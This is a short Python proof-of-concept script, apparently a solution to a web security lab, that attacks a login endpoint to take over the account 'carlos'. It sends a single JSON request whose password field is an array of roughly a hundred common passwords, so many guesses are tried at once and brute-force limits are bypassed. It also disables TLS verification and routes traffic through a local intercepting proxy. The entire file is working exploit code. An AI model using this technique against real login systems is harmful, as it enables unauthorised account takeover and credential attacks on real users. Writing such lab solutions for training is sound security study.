import requests
import json
import sys  
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def access_carlos_acc(s, url):
    print("Exploiting Vuln....")
    login_url = url + "/login"
    payload = {"username": "carlos", "password": ["123456","password","12345678","qwerty",
                                                  "123456789","12345","1234","111111",
                                                  "1234567","dragon","123123","baseball","abc123",
                                                  "football","monkey","letmein","shadow","master",
                                                  "666666","qwertyuiop","123321","mustang",
                                                  "1234567890","michael","654321","superman","1qaz2wsx",
                                                  "7777777","121212","000000","qazwsx","123qwe","killer",
                                                  "trustno1","jordan","jennifer","zxcvbnm",
                                                  "asdfgh","hunter","buster","soccer","harley",
                                                  "batman","andrew","tigger","sunshine","iloveyou","2000",
                                                  "charlie","robert","thomas","hockey","ranger",
                                                  "daniel","starwars","klaster","112233","george",
                                                  "computer","michelle","jessica","pepper","1111",
                                                  "zxcvbn","555555","11111111","131313","freedom",
                                                  "777777","pass","maggie","159753","aaaaaa",
                                                  "ginger","princess","joshua","cheese",
                                                  "amanda","summer","love","ashley",
                                                  "nicole","chelsea","biteme","matthew","access",
                                                  "yankees","987654321","dallas","austin","thunder",
                                                  "taylor","matrix","mobilemail","mom","monitor",
                                                  "monitoring","montana","moon","moscow","random"]
                                                }
    headers = {"Content-Type": "application/json"}
    r = s.post(login_url, data=json.dumps(payload), headers=headers, verify=False,proxies=proxies)
    
    if "Log out" in r.text:
        sys.stdout.write("successfully access carlos account\n")
    
    else:
        sys.stdout.write("could not access carlos account\n")
        sys.exit(1)
    


def main():
    if len(sys.argv) != 2:
        print("Usage: python3 POC.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    s = requests.Session()
    access_carlos_acc(s, url)
    

if __name__ == "__main__":
    main()
